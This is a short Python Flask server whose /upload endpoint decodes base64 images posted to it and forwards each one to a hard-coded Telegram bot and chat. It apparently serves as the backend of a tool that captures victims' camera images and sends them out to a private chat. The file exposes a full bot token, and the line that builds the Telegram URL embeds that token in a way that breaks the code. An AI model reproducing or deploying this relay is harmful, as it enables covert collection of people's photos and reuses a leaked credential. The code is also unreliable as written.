from flask import Flask, request
import requests
import base64

app = Flask(__name__)

BOT_TOKEN = "8028778856:AAFp8ipRh4pgjZhz1Q6jSYf5wM6otqpzeHU"
CHAT_ID = "8137776838"

@app.route("/")
def home():
    return "Server Running ✅"

@app.route("/upload", methods=["POST"])
def upload():
    data = request.json
    image = data["image"]

    image_data = image.split(",")[1]

    with open("photo.png", "wb") as f:
        f.write(base64.b64decode(image_data))

    url = f"https://api.telegram.org/bot{8028778856:AAFp8ipRh4pgjZhz1Q6jSYf5wM6otqpzeHU}/sendPhoto"
    
    with open("photo.png", "rb") as photo:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": photo})

    return {"status": "ok"}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
